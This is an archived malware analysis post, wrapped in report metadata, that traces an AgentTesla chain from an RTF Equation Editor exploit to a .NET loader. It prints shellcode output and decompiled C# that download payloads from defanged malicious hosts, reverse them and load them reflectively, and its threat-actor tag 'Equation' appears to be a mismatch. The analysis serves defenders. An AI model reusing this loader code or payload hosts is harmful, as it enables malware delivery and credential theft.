{
    "id": "015d7d4b-8013-4464-b337-c931614d2e64",
    "created_at": "2023-01-12T15:06:29.404724Z",
    "updated_at": "2025-03-27T02:07:59.94602Z",
    "deleted_at": null,
    "sha1_hash": "8b3ea64e39353654be290e7d0a454002abf2b004",
    "title": "2022-02-06 - AgentTesla From RTF Exploitation to .NET Tradecraft",
    "authors": "",
    "file_creation_date": "2022-05-28T05:07:08Z",
    "file_modification_date": "2022-05-28T05:07:08Z",
    "file_size": 152132,
    "plain_text": "# AgentTesla From RTF Exploitation to .NET Tradecraft\n\n**forensicitguy.github.io/agenttesla-rtf-dotnet-tradecraft/**\n\n### By Tony Lambert Posted 2022-02-06 Updated 2022-03-28 18 min read\n\n\nFebruary 6, 2022\n\n\n### When adversaries buy and deploy threats like AgentTesla you often see this functional and entertaining chain of older exploitation activity with some .NET framework tradecraft you’d expect from some modern implants. In this post I’ll walk through analyzing one such sample that involves RTF/Equation Editor exploitation and a modular downloader that invokes AgentTesla. If you want to follow along at home, the sample is in MalwareBazaar here: https://bazaar.abuse.ch/sample/213d36f7d37abac0df9187e6ce3ed8e26bc61bd3e02a725b079be90d7 cfd5117/.\n\n## Triage the Document File\n\n### MalwareBazaar says we have a DOC file, but it could be wrong so let’s take a look with a couple different tools.\n```\n  remnux@remnux:~/cases/tesla-rtf$ file\n  orden.doc \n  orden.doc: Rich Text Format data, unknown\n  version\n  remnux@remnux:~/cases/tesla-rtf$ diec\n  orden.doc \n  filetype: Binary\n  arch: NOEXEC\n  mode: Unknown\n  endianess: LE\n  type: Unknown\n   format: RTF\n   format: plain text[CR]\n\n The magic bytes for this file make file and Detect-It-Easy think the it’s a Rich Text Format file. This file type shifts our analysis path a bit. If the document was a DOC or DOCX format we might expect VBA macros. In this case malicious RTF files commonly contain embedded OLE objects or exploit\n\n```\n\n-----\n\n### shellcode for a handful of CVEs in MS Office Equation Editor that are about 5 years old. But the exploits still work. Let’s see which attack path we have here.\n\n## Analyzing the RTF Document\n\n### Our first analysis path should be to rule out whether embedded OLE things are in the file. We can do this using a combination of rtfobj and rtfdump.py .\n```\n  remnux@remnux:~/cases/tesla-rtf$ rtfobj orden.rtf \n  rtfobj 0.60 on Python 3.8.10 - http://decalage.info/python/oletools\n  THIS IS WORK IN PROGRESS - Check updates regularly!\n  Please report any issue at https://github.com/decalage2/oletools/issues\n  ==========================================================================\n  =====\n  File: 'orden.rtf' - size: 3852 bytes\n  ---+----------+----------------------------------------------------------  ---  id |index   |OLE Object                         \n  ---+----------+----------------------------------------------------------  ---  0 |00000120h |Not a well-formed OLE object                \n  ---+----------+----------------------------------------------------------  ---  1 |000000CAh |Not a well-formed OLE object                \n  ---+----------+----------------------------------------------------------  ---  remnux@remnux:~/cases/tesla-rtf$ rtfdump.py -f O orden.rtf \n  remnux@remnux:~/cases/tesla-rtf$ \n\n The output from rtfobj and rtfdump.py both indicate there aren’t OLE objects expected here. If there were we’d likely see an OLE object describing a SCT script file or something similar. So I’m thinking we have RTF Equation Editor exploitation shellcode here. Let’s hunt for that using\n\n```\n\n-----\n\n```\nrtfdump.py .\n  remnux@remnux:~/cases/tesla-rtf$ rtfdump.py orden.rtf \n    1 Level 1    c=  1 p=00000000 l=  3850 h=  3258;  3115 b=    0  u=  \n  44 \\rtf4818\n    2 Level 2    c=  1 p=00000012 l=  3831 h=  3255;  3115 b=    0  u=  \n  38 \\object18503741\n    3  Level 3   c=  2 p=000000b9 l=  3663 h=  3247;  3115 b=    0  u=  \n  38 \\*\\objdata132794\n    4  Level 4   c=  1 p=000000cb l=   274 h=   21;   11 b=    0  u=  \n  38 \n    5   Level 5  c=  1 p=000000cc l=   272 h=   21;   11 b=    0  u=  \n  38 \n  ...\n   68         c=  0 p=000001ff l=   82 h=   18;   18 b=    0  u=  \n  0 \\*\\levelprevspace569740588\n\n### It looks like there are 68 streams here in the document, and we want to inspect the streams starting from largest to smallest until you start finding streams with hardly any data. In this document we’ll focus on the first 3 streams since they’re large.\n  remnux@remnux:~/cases/tesla-rtf$ rtfdump.py -H -s 1 orden.rtf | head\n  00000000: B5 61 85 03 74 16 DF DE F3 12 CD 0C 6C 23 D2 CC \n  .a..t.......l#..\n  00000010: 56 97 40 58 85 69 74 05 88 CA E9 7B 08 02 00 00 V.@X.it....\n  {....\n  00000020: 00 0B 00 00 00 45 71 55 41 54 69 4F 4E 2E 33 00 \n  .....EqUATiON.3.\n  00000030: 00 00 00 00 00 00 00 00 19 06 00 00 02 7E 01 EB \n  .............~..\n  00000040: 47 0A 01 05 A0 26 3B EC 00 00 00 00 00 00 00 00 \n  G....&;.........\n  00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \n  ................\n  00000060: 00 50 06 45 00 00 00 00 00 00 00 00 00 00 00 00 \n  .P.E............\n  00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \n  ................\n  00000080: 00 29 C3 44 00 00 00 00 E9 74 01 00 00 03 34 AD \n  .).D.....t....4.\n  00000090: 9D 71 6B 52 A9 8A 3B 6E 7B 04 76 FB 3A 6B AB E6 \n  .qkR..;n{.v.:k..\n  emnux@remnux:~/cases/tesla-rtf$ rtfdump.py -H -s 2 orden.rtf | head\n  00000000: 18 50 37 41 6D FD EF 31 2C D0 C6 C2 3D 2C C5 69 \n  .P7Am..1,...=,.i\n  00000010: 74 05 88 56 97 40 58 8C AE 97 B0 80 20 00 00 00 \n  t..V.@X..... ...\n  00000020: B0 00 00 04 57 15 54 15 46 94 F4 E2 E3 30 00 00 \n  ....W.T.F....0..\n  00000030: 00 00 00 00 00 00 01 90 60 00 00 27 E0 1E B4 70 \n  ........`..'...p\n  00000040: A0 10 5A 02 63 BE C0 00 00 00 00 00 00 00 00 00 \n  ..Z.c...........\n\n```\n\n-----\n\n```\n................\n00000060: 00 64 50 00 00 00 00 00 00 00 00 00 00 00 00 00 \n.dP.............\n00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 02 \n................\n00000080: 9C 34 40 00 00 00 0E 97 40 10 00 00 33 4A D9 D7 \n.4@.....@...3J..\n00000090: 16 B5 2A 98 A3 B6 E7 B0 47 6F B3 A6 BA BE 67 35 \n..*.....Go....g5\nremnux@remnux:~/cases/tesla-rtf$ rtfdump.py -H -s 3 orden.rtf | head\n00000000: 6D FD EF 31 2C D0 C6 C2 3D 2C C5 69 74 05 88 56 \nm..1,...=,.it..V\n00000010: 97 40 58 8C AE 97 B0 80 20 00 00 00 B0 00 00 04 .@X.....\n.......\n00000020: 57 15 54 15 46 94 F4 E2 E3 30 00 00 00 00 00 00 \nW.T.F....0......\n00000030: 00 00 01 90 60 00 00 27 E0 1E B4 70 A0 10 5A 02 \n....`..'...p..Z.\n00000040: 63 BE C0 00 00 00 00 00 00 00 00 00 00 00 00 00 \nc...............\n00000050: 00 00 00 00 00 00 00 00 00 00 00 05 00 64 50 00 \n.............dP.\n00000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \n................\n00000070: 00 00 00 00 00 00 00 00 00 00 00 02 9C 34 40 00 \n.............4@.\n00000080: 00 00 0E 97 40 10 00 00 33 4A D9 D7 16 B5 2A 98 \n....@...3J....*.\n00000090: A3 B6 E7 B0 47 6F B3 A6 BA BE 67 35 C7 35 05 7C \n....Go....g5.5.|\n\n```\n\n-----\n\n### Stream 1 has the string EqUATiON.3 pretty close to its head, so that s going to be our best bet to keep analysis going. We can extract it using rtfdump.py again.\n```\n  remnux@remnux:~/cases/tesla-rtf$ rtfdump.py -d -H -s 1 orden.rtf >\n  1.dat\n  remnux@remnux:~/cases/tesla-rtf$ file 1.dat \n  1.dat: data\n\n It looks like the first stream exported and gave us some data as expected. For the next step, we need to deduce the entry point of the shellcode. From there we can emulate the shellcode execution. The best way I’ve seen to identify the shellcode entry point so far is to use xorsearch.py -W .\n  remnux@remnux:~/cases/tesla-rtf$ xorsearch -W\n  1.dat \n  Found XOR 00 position 00000201: GetEIP method 2\n  EB11\n  Found ROT 25 position 00000201: GetEIP method 2\n  EB11\n  Found ROT 24 position 00000201: GetEIP method 2\n  EB11\n  Found ROT 23 position 00000201: GetEIP method 2\n  EB11\n  Found ROT 22 position 00000201: GetEIP method 2\n  EB11\n  Found ROT 21 position 00000201: GetEIP method 2\n  EB11\n  Found ROT 20 position 00000201: GetEIP method 2\n  EB11\n  Found ROT 19 position 00000201: GetEIP method 2\n  EB11\n  Found ROT 18 position 00000201: GetEIP method 2\n  EB11\n  Found ROT 17 position 00000201: GetEIP method 2\n  EB11\n  Found ROT 16 position 00000201: GetEIP method 2\n  EB11\n  Found ROT 15 position 00000201: GetEIP method 2\n  EB11\n  Found ROT 14 position 00000201: GetEIP method 2\n  EB11\n  Found ROT 13 position 00000201: GetEIP method 2\n  EB11\n  Found ROT 12 position 00000201: GetEIP method 2\n  EB11\n  Found ROT 11 position 00000201: GetEIP method 2\n  EB11\n  Found ROT 10 position 00000201: GetEIP method 2\n  EB11\n  Found ROT 09 position 00000201: GetEIP method 2\n  EB11\n  Found ROT 08 position 00000201: GetEIP method 2\n  EB11\n\n```\n\n-----\n\n```\n          p\n  EB11\n  Found ROT 06 position 00000201: GetEIP method 2\n  EB11\n  Found ROT 05 position 00000201: GetEIP method 2\n  EB11\n  Found ROT 04 position 00000201: GetEIP method 2\n  EB11\n  Found ROT 03 position 00000201: GetEIP method 2\n  EB11\n  Found ROT 02 position 00000201: GetEIP method 2\n  EB11\n  Found ROT 01 position 00000201: GetEIP method 2\n  EB11\n  Score: 260\n\n### It looks like xorsearch.py located a GetEIP method used by shellcode to figure out its orientation in memory. We can feed that 00000201 offset into our shellcode emulator scdbg .\n\n And we get some text output from the emulator to show what the shellcode does (I went ahead and defanged the URL).\n\n```\n\n-----\n\n```\n  401438 GetProcAddress(ExpandEnvironmentStringsW)\n  401477 ExpandEnvironmentStringsW(%APPDATA%\\zxcbnmgu.exe, dst=12fad8, sz=104)\n  40148c LoadLibraryW(UrlMon)\n  4014a7 GetProcAddress(URLDownloadToFileW)\n  401503 URLDownloadToFileW(hxxp://scottbyscott[.]com/ebux/try.exe,\n  C:\\users\\remnux\\Application Data\\zxcbnmgu.exe)\n  40151f GetProcAddress(WideCharToMultiByte)\n  40153d WideCharToMultiByte(0,0,in=12fad8,sz=ffffffff,out=12fcf4,sz=104,0,0) = 0\n  40154d GetProcAddress(WinExec)\n  401559 WinExec()\n  40156d GetProcAddress(ExitProcess)\n  401571 ExitProcess(0)\n\n### There are a few Win32 API calls here, but there are only a few for us to worry about. The\nExpandEnvironmentStringsW function looks like it’s preparing for the adversary to write a file to\n%APPDATA%\\zxcbnmgu.exe . Next, the URLDownloadToFileW function retrieves some content from\nscottbyscott[.]com and writes the EXE to that file under AppData. Finally, the downloaded\n\n application launches and Equation Editor exits using ExitProcess.\n\n Now we have some additional EXE content to work with!\n\n## Analyzing the Try.exe Binary\n\n### Using Detect-It-Easy we can see the try.exe binary is a .NET executable.\n  remnux@remnux:~/cases/tesla-rtf$ diec try.exe \n  filetype: PE32\n  arch: I386\n  mode: 32-bit\n  endianess: LE\n  type: Console\n   library: .NET(v4.0.30319)[-]\n   linker: Microsoft Linker(48.0)\n  [Console32,console]\n\n```\n\n-----\n\n### This is a stroke of good fortune for us, because we can pretty easily get this back to source code for inspection. To do so, we can use ilspycmd and pray there’s no obfuscation.\n```\n  remnux@remnux:~/cases/tesla-rtf$ ilspycmd try.exe >\n  try.decompiled.cs\n  remnux@remnux:~/cases/tesla-rtf$ head try.decompiled.cs \n  using System;\n  using System.CodeDom.Compiler;\n  using System.ComponentModel;\n  using System.Configuration;\n  using System.Diagnostics;\n  using System.Globalization;\n  using System.Net.Http;\n  using System.Reflection;\n  using System.Resources;\n  using System.Runtime.CompilerServices;\n\n Awesome, it looks like we got some successful decompilation. Let’s inspect the code.\n\n```\n\n-----\n\n```\n  [assembly: AssemblyTitle(\"Google Chrome\")]\n  [assembly: AssemblyDescription(\"Google Chrome\")]\n  [assembly: AssemblyConfiguration(\"\")]\n  [assembly: AssemblyCompany(\"Google LLC\")]\n  [assembly: AssemblyProduct(\"Google Chrome\")]\n  [assembly: AssemblyCopyright(\"Copyright 2022 Google LLC. All rights reserved.\")]\n  [assembly: AssemblyTrademark(\"\")]\n  [assembly: ComVisible(false)]\n  [assembly: Guid(\"9ed52309-a8ba-46e5-8d13-1d18443695a0\")]\n  [assembly: AssemblyFileVersion(\"100.0.4869.0\")]\n  [assembly: TargetFramework(\".NETFramework,Version=v4.6\", FrameworkDisplayName = \".NET\n  Framework 4.6\")]\n  [assembly: AssemblyVersion(\"100.0.4869.0\")]\n\n### Immediately in the assembly properties we can tell the adversary is trying to masquerade as Google Chrome. They’re trying to pose as Chrome v100. Another good data point is the GUID value in the assembly properties. If you have VirusTotal Enterprise/Intelligence you can plug that GUID into a search using netguid: and pivot to find similar .NET binaries. Alright, since this is a .NET EXE and not a DLL, let’s try to find the entry point. It should be the function Main().\n\n```\n\n-----\n\n```\n  private static byte[] _buffer;\n  private static Assembly _assembly;\n  [STAThread]\n  private static void Main()\n  {\n  Native.ShowWindow(Process.GetCurrentProcess().get_MainWindowHandle(),\n  0);\n    Read();\n    if (BufferLength() > 0)\n    {\n      if (Mix() > -1 && ACMP() > -1)\n      {\n        Console.WriteLine(\"Done\");\n      }\n      return;\n    }\n    throw new Exception();\n  }\n\n### Sure enough, we have a Main function that IS NOT OBFUSCATED! This calls for a drink. Anyways, it looks like Main calls 4 functions defined in the code:\n\n Read() BufferLength() Mix() ACMP()\n\n Let’s take a look at Read() first.\n\n```\n\n-----\n\n```\n  private static bool Read()\n  {\n    try\n    {\n      for (int i = 0; i < 5; i++)\n      {\n        ProcessStartInfo val = new\n  ProcessStartInfo();\n        val.set_FileName(\"powershell\");\n        val.set_Arguments(\"Test-Connection\n  127.0.0.1\");\n        val.set_CreateNoWindow(true);\n  val.set_WindowStyle((ProcessWindowStyle)1);\n        Process.Start(val).WaitForExit();\n      }\n      return true;\n    }\n    catch\n    {\n    }\n    return false;\n  }\n\n### The Read() function looks like it pieces together a PowerShell connection using a ProcessStartInfo object and executes it with Process.Start, waiting for the process to finish. Once the command gets build and run, it’ll execute powershell.exe Test-Connection 127.0.0.1 . The Test-Connection cmdlet in PowerShell is similar to a ping command. When I see this activity in the wild it’s usually either a connectivity test or a method to impose a time delay. Once this time delay finishes, the method returns and moves to BufferLength().\n\n```\n\n-----\n\n```\n  private static long BufferLength()\n  {\n    _buffer =\n  ((Task<byte[]>)typeof(HttpClient).GetMethod(\"SrdsGetBySrdsteArrSrdsayAsySrdsnc\".Replace(\"S\n  rds\", \"\"), new Type[1]\n    {\n      typeof(string)\n    })!.Invoke(new HttpClient(), new object[1]\n    {\n      \"hxxp://185.222.58[.]56/try.png\"\n    })).Result;\n    return _buffer.Length;\n  }\n\n### So the BufferLength() function downloads content into a byte array in a rather verbose way. It searches the HttpClient .NET class for the method GetByteArrayAsync() and then invokes it with a URL argument. The result gets saved into _buffer, a byte array variable, and the function returns the length of this variable. The return value gets used in a BufferLength() > 0 check to make sure some content downloaded before proceeding. Now let’s look at the Mix() function.\n  private static long Mix()\n  {\n    Array.Reverse((Array)_buffer, 0,\n  _buffer.Length);\n    _assembly = Assembly.Load(_buffer);\n    return _assembly.HostContext;\n  }\n\n The Mix() function takes the _buffer variable, reverses its contents, and reflectively loads the reversed contents into a _assembly variable. At this point we can be pretty certain that _buffer contains a .NET assembly inside its byte array and that assembly is loaded into memory. From here, we can assume there will be some kind of Invoke method occurring in ACMP().\n\n```\n\n-----\n\n```\n  private static long ACMP()\n  {\n    Type[] exportedTypes = _assembly.GetExportedTypes();\n    foreach (Type type in exportedTypes)\n    {\n      MethodInfo[] methods = type.GetMethods();\n      foreach (MethodInfo methodInfo in methods)\n      {\n        if (methodInfo.Name ==\n  \"Qddywbxavgtbjaukcldrpmcm\")\n        {\n          return (long)methodInfo.Invoke(null,\n  null);\n        }\n      }\n    }\n    return 0L;\n  }\n\n### The ACMP() function enumerates the methods in the assembly that was just reflectively loaded in\n_assembly, looking for a method named Qddywbxavgtbjaukcldrpmcm() . Once found, it invokes\n\n the method.\n\n Thus ends the story of try.exe, now it’s time to analyze try.png that was downloaded.\n\n## Analyzing the Try.PNG File\n\n### Remembering back to the Mix() function, the bytes of try.png are reversed before they get loaded as a .NET assembly. First, we need to make sure the file we have is a reversed EXE or DLL.\n\n```\n\n-----\n\n```\n  remnux@remnux:~/cases/tesla-rtf$ xxd -C try.png | head\n  00000000: 0000 0000 0000 0000 0000 0000 0000 0000 \n  ................\n  00000010: 0000 0000 0000 0000 0000 0000 0000 0000 \n  ................\n  00000020: 0000 0000 0000 0000 0000 0000 0000 0000 \n  ................\n  00000030: 0000 0000 0000 0000 0000 0000 0000 0000 \n  ................\n  00000040: 0000 0000 0000 0000 0000 0000 0000 0000 \n  ................\n  00000050: 0000 0000 0000 0000 0000 0000 0000 0000 \n  ................\n  00000060: 0000 0000 0000 0000 0000 0000 0000 0000 \n  ................\n  00000070: 0000 0000 0000 0000 0000 0000 0000 0000 \n  ................\n  00000080: 0000 0000 0000 0000 0000 0000 0000 0000 \n  ................\n  00000090: 0000 0000 0000 0000 0000 0000 0000 0000 \n  ................\n  remnux@remnux:~/cases/tesla-rtf$ xxd -C try.png | tail\n  00082b60: 0008 2400 0006 010b 210e 00e0 0000 0000 \n  ..$.....!.......\n  00082b70: 0000 0000 61fd 4946 0003 014c 0000 4550 \n  ....a.IF...L..EP\n  00082b80: 0000 0000 0000 0024 0a0d 0d2e 6564 6f6d \n  .......$....edom\n  00082b90: 2053 4f44 206e 6920 6e75 7220 6562 2074  SOD ni nur\n  eb t\n  00082ba0: 6f6e 6e61 6320 6d61 7267 6f72 7020 7369 onnac\n  margorp si\n  00082bb0: 6854 21cd 4c01 b821 cd09 b400 0eba 1f0e \n  hT!.L..!........\n  00082bc0: 0000 0080 0000 0000 0000 0000 0000 0000 \n  ................\n  00082bd0: 0000 0000 0000 0000 0000 0000 0000 0000 \n  ................\n  00082be0: 0000 0000 0000 0040 0000 0000 0000 00b8 \n  .......@........\n  00082bf0: 0000 ffff 0000 0004 0000 0003 0090 5a4d \n  ..............ZM\n\n### Sure enough, the end of try.png looks like it ends with a reversed MZ and has a reversed DOS stub. We can easily reverse these bytes using a bit of PowerShell code.\n\n```\n\n-----\n\n```\n  [Byte[]] $contents = Get-Content -AsByteStream ./try.png \n  [Array]::Reverse($contents)\n  Set-Content -Path ./reversed_try.png -Value $contents   AsByteStream\n\n### Now we have a .NET DLL in reversed_try.png !\n  remnux@remnux:~/cases/tesla-rtf$ diec\n  reversed_try.png \n  filetype: PE32\n  arch: I386\n  mode: 32-bit\n  endianess: LE\n  type: DLL\n   library: .NET(v4.0.30319)[-]\n   linker: Microsoft Linker(6.0)[DLL32]\n\n Just like before with try.exe we can give this a shot at decompiling, but in this case there is a lot of obfuscation.\n\n```\n\n-----\n\n```\n  remnux@remnux:~/cases/tesla-rtf$ ilspycmd reversed_try.png >\n  reversed_try.decompiled.cs\n  remnux@remnux:~/cases/tesla-rtf$ head reversed_try.decompiled.cs \n  using System;\n  using System.CodeDom.Compiler;\n  using System.Collections;\n  using System.Collections.Concurrent;\n  using System.Collections.Generic;\n  using System.Diagnostics;\n  using System.Drawing;\n  using System.Globalization;\n  using System.IO;\n  using System.Reflection;\n\n### We have some valid C# code, so let’s take a look and see how heavy the obfuscation is. Immediately we can see that the obfuscation is beyond just some string scrambling and gets into Unicode madness.\n  internal class <Module>\n  {\n    static <Module>()\n    {\n      if (uint.MaxValue != 0)\n      {\n        \\u0005\\u2009\\u2000.\\u0002();\n      }\n      if (7u != 0)\n      {\n        f0659e5905454a5e99b9752afc78b700();\n      }\n      if (true)\n      {\n        \\u0008\\u2002\\u2000.\\u0002();\n      }\n    }\n    private static void\n  f0659e5905454a5e99b9752afc78b700()\n    {\n      if (4u != 0)\n      {\n        \\u0008\\u2009\\u2000.\\u0002();\n\n```\n\n-----\n\n```\n       }\n    }\n  }\n\n### This is a level of obfuscation that tends to keep me up a little too late at night, so I’m going to cut analysis short here but mention another little part of this binary: .NET resources.\n\n## Extracting .NET Resources\n\n### It’s really common for adversaries to hide executable content within Windows PE resources. The same is true of .NET assemblies, but assemblies have resources stored in a different way than traditional PE resources. AgentTesla has done this in the past and it seems like the same is occurring here:\n\n```\n\n-----\n\n```\n  Stream? manifestResourceStream =\n  typeof(\\u0002\\u200a\\u2000).Assembly.GetManifestResourceStream(\"289e8a8929dc4fc2616eefa4e38317\n  22\");\n  byte[] array = new byte[128];\n  if (8u != 0)\n  {\n    RuntimeHelpers.InitializeArray(array, (RuntimeFieldHandle)/*OpCode not supported:\n  LdMemberToken*/);\n  }\n  Stream stream = \\u0008\\u2006.\\u0002(manifestResourceStream, array, \\u0002());\n  if (4u != 0)\n  {\n    \\u0005\\u200a\\u2000 = stream;\n  }\n\n### In the obfuscated .NET DLL it looks like the code is retrieving additional content from a .NET resource in the binary named 289e8a8929dc4fc2616eefa4e3831722 and working with it. During analysis I used this PowerShell code to extract the resource, but you can also use ILSpy or DNSpy.\n  $teslaAssembly = [System.Reflection.Assembly]::LoadFile('/home/remnux/cases/tesla  rtf/reversed_try.png')\n  $teslaManifestName = $teslaAssembly.GetManifestResourceNames()\n  $teslaResourceStream =\n  $teslaAssembly.GetManifestResourceStream('289e8a8929dc4fc2616eefa4e3831722')\n  $resourceContents = [byte[]]::new([System.Convert]::ToInt32($teslaResourceStream.length))\n  $teslaResourceStream.Read($resourceContents,0,\n  [System.Convert]::ToInt32($teslaResourceStream.Length))\n  Set-Content -Path 289e8a8929dc4fc2616eefa4e3831722 -Value $resourceContents -AsByteStream\n\n The contents of 289e8a8929dc4fc2616eefa4e3831722 are presumably XOR’d but I haven’t fully run that to ground yet.\n\n## Adversary Decisions\n\n### I want to close out the post by pointing out a design decision in this threat that interests me a bit. The adversary used try.exe, compiled .NET code, to download and execute an additional .NET DLL. Several other threats in the wild also use this technique such as Yellow Cockatoo/Jupyter and GootLoader. It’s a relatively simple endeavor to write Invoke-WebRequest commands in PowerShell and call [System.Reflection.Assembly]::Load to load a byte array into memory The adversary\n\n```\n\n-----\n\n### here decided to make this download via a non-obfuscated binary, making analysis really simple. They also ran the risk of application allowlisting running on the host. If allowlisting was present, they’d fail their objective and need to use PowerShell instead. However, doing so with PowerShell also opens up the adversary to risk by allowing PowerShell log analysis. All of these decisions have advantages and disadvantages.\n\n Thanks for reading and have a good week!\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-02-06 - AgentTesla From RTF Exploitation to .NET Tradecraft.pdf"
    ],
    "report_names": [
        "2022-02-06 - AgentTesla From RTF Exploitation to .NET Tradecraft.pdf"
    ],
    "threat_actors": [
        {
            "id": "b740943a-da51-4133-855b-df29822531ea",
            "created_at": "2022-10-25T15:50:23.604126Z",
            "updated_at": "2025-03-27T02:00:55.505366Z",
            "deleted_at": null,
            "main_name": "Equation",
            "aliases": [
                "Equation"
            ],
            "source_name": "MITRE:Equation",
            "tools": null,
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535989,
    "ts_updated_at": 1743041279,
    "ts_creation_date": 1653714428,
    "ts_modification_date": 1653714428,
    "files": {
        "pdf": "https://archive.orkl.eu/8b3ea64e39353654be290e7d0a454002abf2b004.pdf",
        "text": "https://archive.orkl.eu/8b3ea64e39353654be290e7d0a454002abf2b004.txt",
        "img": "https://archive.orkl.eu/8b3ea64e39353654be290e7d0a454002abf2b004.jpg"
    }
}